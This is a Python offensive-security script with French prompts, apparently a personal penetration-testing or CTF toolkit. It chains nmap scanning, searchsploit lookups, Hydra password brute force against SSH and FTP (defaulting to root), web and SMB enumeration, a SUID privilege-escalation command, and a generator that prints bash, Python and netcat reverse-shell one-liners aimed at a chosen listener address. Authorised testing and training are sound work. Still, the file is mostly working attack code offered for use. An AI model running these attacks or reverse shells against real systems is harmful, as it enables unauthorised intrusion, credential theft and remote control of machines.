import nmap
import subprocess
import os
import sys
from datetime import datetime
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel
import questionary

console = Console()

donnees_rapport = {
    "cible": "", "date": "", "ports": [], "vulns": [], "mots_de_passe": []
}

# --- SYSTÈME D'AUTO-UPDATE ---
def auto_update():
    if os.path.exists(".git"):
        console.print("[dim cyan][*] Recherche de mises à jour sur GitHub...[/dim cyan]")
        try:
            res = subprocess.run(["git", "pull"], capture_output=True, text=True, timeout=5)
            if "Already up to date" not in res.stdout and "files changed" in res.stdout:
                console.print("[bold yellow][!] Nouvelle version détectée et téléchargée ! Redémarrage...[/bold yellow]")
                os.execv(sys.executable, ['python'] + sys.argv)
        except Exception: pass

def ecrire_rapport(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if not os.path.exists("rapports"): os.makedirs("rapports")
    with open("rapports/rapport_audit.txt", "a") as f: f.write(f"[{timestamp}] {message}\n")

def generer_html():
    if not os.path.exists("rapports"): os.makedirs("rapports")
    html = f"<html><head><meta charset='utf-8'><title>Rapport - {donnees_rapport['cible']}</title></head>"
    html += f"<body style='font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; padding: 20px;'>"
    html += f"<h1 style='color: #00ff00;'>Rapport d'Audit : {donnees_rapport['cible']}</h1>"
    html += "<h2>Vulnérabilités / Découvertes</h2><table border='1' style='border-collapse: collapse; width: 100%;'>"
    html += "<tr style='background: #333;'><th>Sévérité</th><th>Outil</th><th>Détail</th></tr>"
    for v in donnees_rapport["vulns"]: 
        html += f"<tr><td>{v.get('severite', 'Info')}</td><td>{v['outil']}</td><td>{v['nom']}</td></tr>"
    html += "</table></body></html>"
    with open("rapports/rapport.html", "w") as f: f.write(html)
    console.print("\n[bold green]>>> Rapport généré : rapports/rapport.html <<<[/bold green]")

# --- ÉTAPE 1 : SCAN (NMAP) ---
def scan_target(ip):
    donnees_rapport["cible"] = ip
    nm = nmap.PortScanner()
    results = []
    with console.status(f"[bold green]Analyse furtive de {ip} en cours...[/bold green]"):
        try:
            nm.scan(ip, arguments='-Pn -sV -T4')
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        if nm[host][proto][port]['state'] == 'open':
                            p_info = {
                                'port': port, 
                                'service': nm[host][proto][port]['name'], 
                                'product': nm[host][proto][port].get('product', ''), 
                                'version': nm[host][proto][port].get('version', '')
                            }
                            results.append(p_info)
                            donnees_rapport["ports"].append(p_info)
        except Exception as e: console.print(f"[bold red]Erreur Nmap : {e}[/bold red]")
    return results

# --- ÉTAPE 2 : SEARCHSPLOIT INTELLIGENT ---
def run_searchsploit(open_ports):
    console.print("\n[bold yellow][*] Recherche d'Exploits (Smart Mode)...[/bold yellow]")
    for p in open_ports:
        product = p['product'].split()[0] if p['product'] else p['service']
        version = p['version'].split()[0] if p['version'] else ""
        
        # 1. Recherche Large (Toujours exécutée pour ne rien rater)
        console.print(f"\n[bold blue]🔍 Test générique : {product}[/bold blue]")
        subprocess.run(["searchsploit", "--disable-colour", product])
        
        # 2. Recherche Précise (Seulement si on a une version)
        if version:
            console.print(f"[bold magenta]🎯 Test précis : {product} {version}[/bold magenta]")
            subprocess.run(["searchsploit", "--disable-colour", product, version])

# --- ÉTAPE 3 : BRUTEFORCE (HYDRA) ---
def run_hydra(ip, open_ports):
    cibles = [p for p in open_ports if any(s in p['service'].lower() for s in ['ssh', 'ftp'])]
    if not cibles: return console.print("[bold red]Aucun port bruteforçable détecté.[/bold red]")
    for i, p in enumerate(cibles): console.print(f"{i+1}. Port {p['port']} ({p['service']})")
    choix = int(Prompt.ask("Service ?", choices=[str(i+1) for i in range(len(cibles))])) - 1
    cible = cibles[choix]
    user = questionary.text("Utilisateur à attaquer :", default="root").ask()
    
    try:
        process = subprocess.Popen(["hydra", "-l", user, "-P", "common.txt", "-t", "4", "-s", str(cible['port']), f"{cible['service']}://{ip}"], stdout=subprocess.PIPE, text=True)
        for line in process.stdout:
            if "login:" in line.lower(): console.print(f"[bold green]>>> SUCCÈS : {line.strip()} <<<[/bold green]")
    except Exception as e: console.print(f"[bold red]Erreur : {e}[/bold red]")

# --- ÉTAPE 4 : WEB (GOBUSTER & WHATWEB) ---
def run_web_enum(ip, open_ports):
    web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080]]
    if not web_ports: return console.print("[bold red]Aucun port Web détecté.[/bold red]")
    
    for port in web_ports:
        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
        
        # WhatWeb
        console.print(f"\n[bold cyan]=== Profilage WhatWeb pour {url} ===[/bold cyan]")
        try:
            res = subprocess.run(["whatweb", "--color=never", url], capture_output=True, text=True)
            if res.stdout:
                for techno in res.stdout.strip().split(', '):
                    console.print(f"> {techno}")
                    if "]" in techno and "[" in techno:
                        donnees_rapport["vulns"].append({"outil": "WhatWeb", "nom": techno, "severite": "Info"})
        except Exception: pass

        # Gobuster
        console.print(f"\n[bold yellow][*] Fuzzing Gobuster en cours sur {url}...[/bold yellow]")
        try:
            process = subprocess.Popen(["gobuster", "dir", "-u", url, "-w", "common.txt", "-q", "-t", "20"], stdout=subprocess.PIPE, text=True)
            for line in process.stdout:
                if "Status: 200" in line or "Status: 301" in line:
                    console.print(f"[bold green][+] {line.strip()}[/bold green]")
        except KeyboardInterrupt: pass

# --- ÉTAPE 5 : SMB/NFS (NOUVEAU) ---
def run_smb_enum(ip):
    console.print(f"\n[bold yellow][*] Énumération des partages SMB sur {ip}...[/bold yellow]")
    try:
        subprocess.run(["smbclient", "-L", f"//{ip}/", "-N"])
    except FileNotFoundError:
        console.print("[red]smbclient n'est pas installé sur cette machine.[/red]")

# --- ÉTAPE 6 : PRIVESC (NOUVEAU) ---
def run_suid_helper():
    console.print(Panel("[bold red]LANCE CETTE COMMANDE SUR LA CIBLE (SSH/Shell) :[/bold red]\n\n[green]find / -perm -u=s -type f 2>/dev/null[/green]", title="Escalade SUID"))
    console.print("[dim]Cette commande listera les fichiers qui peuvent te donner les droits ROOT (ex: /usr/bin/menu).[/dim]")

# --- ÉTAPE 7 : REVERSE SHELLS ---
def run_payload_generator():
    console.print("\n[bold red]☠️  USINE À REVERSE SHELLS ☠️[/bold red]")
    ip = questionary.text("Ton IP d'écoute (ex: tun0) :").ask()
    port = questionary.text("Ton port d'écoute :", default="4444").ask()
    
    console.print(f"\n[dim]Dans un autre terminal : sudo nc -lvnp {port}[/dim]\n")
    table = Table(title=f"Payloads pour {ip}:{port}", show_lines=True)
    table.add_column("Type", style="magenta"); table.add_column("Commande", style="green")
    table.add_row("Bash", f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'")
    table.add_row("Python3", f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{int(port)}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'")
    table.add_row("Netcat", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
    console.print(table)

# --- MENU PRINCIPAL (INTERACTIF) ---
def interactive_menu(ip, open_ports):
    while True:
        table = Table(title=f"Arsenal Pointé sur : {ip}", border_style="blue")
        table.add_column("Port", style="cyan")
        table.add_column("Service", style="magenta")
        table.add_column("Version", style="yellow")
        for p in open_ports: 
            table.add_row(str(p['port']), p['product'] or p['service'], p['version'] or "Inconnue")
        console.print(table)
        
        choix = questionary.select(
            "💻 Que voulez-vous faire ?",
            choices=[
                "1. Recherche d'exploits (Searchsploit Intelligent)",
                "2. Énumération Web (WhatWeb & Gobuster)",
                "3. Énumération SMB (Partages)",
                "4. Bruteforce (Hydra)",
                "5. Usine à Reverse Shells",
                "6. Aide Escalade de Privilèges (SUID)",
                "7. Générer Rapport & Quitter"
            ]
        ).ask()
        
        if not choix: sys.exit() # Gère le Ctrl+C dans le menu
        
        if "1." in choix: run_searchsploit(open_ports)
        elif "2." in choix: run_web_enum(ip, open_ports)
        elif "3." in choix: run_smb_enum(ip)
        elif "4." in choix: run_hydra(ip, open_ports)
        elif "5." in choix: run_payload_generator()
        elif "6." in choix: run_suid_helper()
        elif "7." in choix: 
            generer_html()
            break

if __name__ == "__main__":
    auto_update()
    console.print(Panel.fit("[bold red]CYBER FRAMEWORK V14[/bold red]", subtitle="Elite Red Team Edition"))
    
    if len(sys.argv) > 1:
        cible = sys.argv[1].replace("https://", "").replace("http://", "").split("/")[0]
    else:
        entree_brute = questionary.text("IP de la cible :").ask()
        if not entree_brute: sys.exit()
        cible = entree_brute.replace("https://", "").replace("http://", "").split("/")[0] if "/" not in entree_brute else entree_brute
    
    ports = scan_target(cible)
    if ports: 
        interactive_menu(cible, ports)
    else: 
        console.print("[red]Aucun port ouvert ou cible injoignable.[/red]")